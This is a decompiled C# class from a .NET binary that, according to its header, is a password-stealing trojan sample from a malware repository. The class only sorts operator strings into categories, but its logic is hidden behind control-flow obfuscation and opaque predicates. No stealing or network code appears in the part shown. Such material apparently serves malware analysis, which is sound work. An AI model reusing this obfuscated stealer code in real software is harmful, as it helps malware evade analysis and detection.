// Decompiled with JetBrains decompiler
// Type: ib.QbG
// Assembly: ContingentPropert, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 10450B75-DDB2-42D8-896D-5D92C0FA5DAE
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-PSW.MSIL.Stealer.gen-f9a3872603bab9d16727daf3e24705ff94100d4bf2838679b5e9288aa02bd32a.exe

using System.Collections.Generic;
using System.Runtime.CompilerServices;

namespace ib
{
  public class QbG : j7, Ho
  {
    internal static QbG Hrs;

    [CompilerGenerated]
    [SpecialName]
    public Hi aSZ() => this.Hi2;

    [CompilerGenerated]
    [SpecialName]
    public void cSE(Hi _param1) => this.Hi2 = _param1;

    [CompilerGenerated]
    [SpecialName]
    public string niZ() => this.jiW;

    [CompilerGenerated]
    [SpecialName]
    public void iit(string _param1) => this.jiW = _param1;

    [SpecialName]
    public fbb oip()
    {
      List<string> stringList1 = new List<string>((IEnumerable<string>) new string[2]
      {
        "&&",
        "||"
      });
      List<string> stringList2 = new List<string>((IEnumerable<string>) new string[3]
      {
        "^",
        "&",
        "|"
      });
      List<string> stringList3 = new List<string>((IEnumerable<string>) new string[6]
      {
        "!=",
        "==",
        "<=",
        ">=",
        "<",
        ">"
      });
      int num1 = 0;
      if (QbG.grf() != null)
        goto label_14;
label_2:
      fbb fbb;
      while (true)
      {
        List<string> stringList4;
        List<string> stringList5;
        List<string> stringList6;
        switch (num1)
        {
          case 1:
          case 6:
            goto label_7;
          case 2:
            if (stringList1.Contains(this.niZ()))
            {
              fbb = fbb.Logical;
              num1 = QbG.grf() == null ? 6 : 6;
              continue;
            }
            if (!stringList2.Contains(this.niZ()))
            {
              if (!stringList6.Contains(this.niZ()))
              {
                fbb = fbb.Undetermined;
                if (QbG.grf() == null)
                {
                  num1 = 1;
                  continue;
                }
                break;
              }
              goto label_8;
            }
            else
              goto label_13;
          case 3:
            if (!stringList4.Contains(this.niZ()))
            {
              if (stringList3.Contains(this.niZ()))
              {
                num1 = 4;
                continue;
              }
              goto case 2;
            }
            else
              goto label_5;
          case 4:
            goto label_6;
          case 5:
            stringList4 = new List<string>((IEnumerable<string>) new string[3]
            {
              "*",
              "/",
              "%"
            });
            if (!stringList5.Contains(this.niZ()))
              goto case 3;
            else
              goto label_11;
          default:
            stringList6 = new List<string>((IEnumerable<string>) new string[2]
            {
              ">>",
              "<<"
            });
            stringList5 = new List<string>((IEnumerable<string>) new string[2]
            {
              "+",
              "-"
            });
            if (QbG.jrT())
            {
              num1 = 5;
              continue;
            }
            break;
        }
        int num2;
        num1 = num2;
      }
label_5:
      fbb = fbb.Product;
      goto label_7;
label_6:
      fbb = fbb.Comparisson;
label_7:
      return fbb;
label_8:
      fbb = fbb.Shift;
      goto label_7;
label_11:
      fbb = fbb.Sum;
      goto label_7;
label_13:
      fbb = fbb.Bitwise;
      goto label_7;
label_14:
      num1 = 0;
      goto label_2;
    }

    public override string ToString() => this.niZ();

    public QbG()
    {
      Jnb.vbPcO4();
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    internal static bool jrT() => QbG.Hrs == null;

    internal static QbG grf() => QbG.Hrs;
  }
}
